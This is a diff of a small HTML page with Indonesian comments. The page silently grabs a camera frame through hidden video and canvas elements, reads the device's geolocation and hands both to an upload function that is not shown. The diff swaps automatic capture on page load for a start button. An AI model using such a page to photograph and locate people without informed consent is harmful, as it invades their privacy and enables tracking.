@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -7,6 +6,8 @@
 </head>
 <body>
   <h2>📸 Mengambil Gambar & Lokasi...</h2>
+  <button id="startCapture">Mulai Ambil Foto & Lokasi</button>
+
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
@@ -26,21 +27,24 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const dataUrl = canvas.toDataURL("image/jpeg");
 
+        // Stop stream setelah ambil gambar
         stream.getTracks().forEach(track => track.stop());
 
+        // Ambil lokasi
         navigator.geolocation.getCurrentPosition(position => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
           uploadData(dataUrl, lat, lon);
         }, err => {
-          alert("Gagal mengambil lokasi: " + err.message);
+          alert("❌ Gagal mengambil lokasi: " + err.message);
         });
       } catch (err) {
-        alert("Gagal akses kamera: " + err.message);
+        alert("❌ Gagal akses kamera: " + err.message);
       }
     }
 
-    window.onload = initCapture;
+    // Tombol diklik => mulai proses
+    document.getElementById("startCapture").addEventListener("click", initCapture);
   </script>
 </body>
 </html>
